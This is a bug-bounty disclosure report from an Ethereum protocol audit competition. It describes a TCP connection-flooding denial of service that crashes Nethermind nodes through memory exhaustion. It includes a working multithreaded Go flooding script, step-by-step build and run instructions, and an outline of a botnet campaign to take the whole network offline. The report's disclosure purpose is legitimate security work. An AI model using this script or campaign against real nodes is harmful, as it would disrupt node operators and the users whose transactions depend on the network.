# #37120 \[BC-Insight] Remote handshake-based TCP/30303 flooding leads to an out-of-memory crash

**Submitted on Nov 25th 2024 at 23:06:28 UTC by \[redacted] for** [**Attackathon | Ethereum Protocol**](https://immunefi.com/audit-competition/ethereum-protocol-attackathon)

* **Report ID:** #37120
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/NethermindEth/nethermind>
* **Impacts:**
  * Unintended chain split affecting greater than or equal to 25% of the network (Network partition)

## Description

## Brief/Intro

A critical remote P2P crash vulnerability has been identified in Nethermind 1.29.1 (latest). If used in the wild it would result in netsplits.

## Vulnerability Details

When blank, telnet-like TCP connections are opened and closed as quickly as possible over TCP/30303, from a multithreaded attack script, an OOM crash occurs in the `nethermind` process - causing it to kill itself and require a manual reboot by node operators.

An attacker would hop the Ethereum network by handshaking into public nodes, gathering their peers, hopping from those, etc. until every `ip:port` in the network is databased for a modified attack script meant to be run on a micro-botnet.

From there, the attack script running on multiple machines would run down the list of peers, opening/closing P2P TCP connections as quickly as possible to trigger thousands of simultaneous crashes until every Nethermind node in the network is offline.

I would like to reiterate that it just connects/disconnects as quickly as possible to an IP:PORT without sending data, but rather spamming telnet-like connections that slide the radar with rate-limiting implementations, either fundamentally or through socks5/botnets/etc.

## Attack code (golang)

This attack code tests against any node you point it at. It is coded for a single attacking machine to disable `nethermind` on a remote victim-node machine. Save the following in a text editor and save it as `attack.go`

```
package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

func main() {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Enter threads: ")
	threadsStr, _ := reader.ReadString('\n')
	threads, _ := strconv.Atoi(strings.TrimSpace(threadsStr))

	var connections int64

	for i := 0; i < threads; i++ {
		go func() {
			for {
				conn, err := net.Dial("tcp", "127.0.0.1:30303")
				if err == nil {
					atomic.AddInt64(&connections, 1)
					conn.Close()
				}
			}
		}()
	}

	ticker := time.NewTicker(time.Second)
	lastCount := int64(0)
	for {
		<-ticker.C
		current := atomic.LoadInt64(&connections)
		rate := current - lastCount
		fmt.Printf("\rConnections/sec: %d Total: %d", rate, current)
		lastCount = current
	}
}
```

## Impact Details

A catastrophic, irrecoverable PR black eye. Users run the risk of their transactions being rejected or sent into the void. Netsplits/partitioning. An attacker could also short the markets and disable > 50% of the network.

## Outro and patch suggestion

This is a viable attack that is low in complexity but critical in impact. It would be easy for any script kiddie with this exploit to bring significant drama to the Ethereum network - bit troubling.

Many blockchain nodes just ban IP addresses that send obscene amounts of connections and requests in a way that doesn't make sense, e.g. TCP flooding the P2P port, incorrectly formatted version messages when handshaking in, etc. and I would study this approach.

## Proof of Concept

## Steps to reproduce (Ubuntu)

1. Open `attack.go` (above) in a text editor and change `127.0.0.1:30303` to your test `nethermind` node's `IP:PORT`, and then follow these instructions on a remote Ubuntu machine:
2. `snap install go --classic`
3. `ulimit -n 100000`
4. `go build attack.go`
5. `go run attack.go`
6. Enter `4000` threads
7. Tap \[Enter] and monitor the victim node's MEM usage until it ultimately crashes.

## PoC

Screenshots of before and after the attack are attached as a PoC.
